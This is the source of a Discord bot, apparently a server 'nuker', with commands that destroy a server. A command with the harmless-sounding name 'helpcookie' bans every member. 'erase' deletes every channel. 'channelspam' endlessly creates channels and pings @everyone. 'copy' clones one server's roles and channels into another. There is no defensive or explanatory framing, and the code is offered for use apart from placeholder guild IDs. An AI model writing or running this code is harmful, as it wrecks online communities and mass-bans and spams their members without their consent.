@bot.command()
async def helpcookie(ctx):
    for member in ctx.guild.members:
        try:
            await member.ban()
        except:
            pass

@bot.command()
async def erase(ctx):
    guild = ctx.guild
    for channel in guild.channels:
        await channel.delete()

    await guild.create_text_channel('commande')
              
@bot.command()
async def channelspam(ctx , arg: str):
     allow_mentions = discord.AllowedMentions(everyone=True)
     guild = ctx.message.guild
     while True:
          channels = await guild.create_text_channel(arg)
          await channels.send(content = "@everyone")


@bot.command()
async def copy(ctx):
    source_guild_id = #Guild to copy 
    target_guild_id = #Receptacle guild

    source_guild = bot.get_guild(source_guild_id)
    target_guild = bot.get_guild(target_guild_id)

    if not source_guild or not target_guild:
        await ctx.send("Unable to find source or target servers.")
        return

    for role in source_guild.roles:
        if role.name == "@everyone":
            continue

        permissions = role.permissions
        await target_guild.create_role(name=role.name, permissions=permissions)

    for category in source_guild.categories:
        new_category = await target_guild.create_category_channel(name=category.name)

        for channel in category.channels:
            if isinstance(channel, discord.VoiceChannel):
                await new_category.create_voice_channel(name=channel.name)
            elif isinstance(channel, discord.TextChannel):
                await new_category.create_text_channel(name=channel.name)
@bot.command()
async def credits(ctx):
    await ctx.send("Bot create bye MilanDevPy")	
